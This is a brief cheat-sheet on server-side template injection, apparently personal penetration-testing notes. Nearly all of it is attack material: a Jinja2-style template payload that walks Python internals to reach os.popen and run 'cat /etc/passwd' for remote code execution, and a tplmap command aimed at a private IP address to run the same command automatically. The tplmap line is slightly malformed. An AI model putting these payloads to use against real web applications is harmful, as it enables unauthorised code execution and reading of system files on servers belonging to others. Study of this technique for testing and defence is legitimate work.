# Server Side Template Injection

Manual RCE

__RCE__ where post is returned
```python
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

Automated TPLMap
```shell
tplmap -u http://10.10.10.10.:5000/ -d 'noot' --os-cmd *cat /etc/passwd*
```
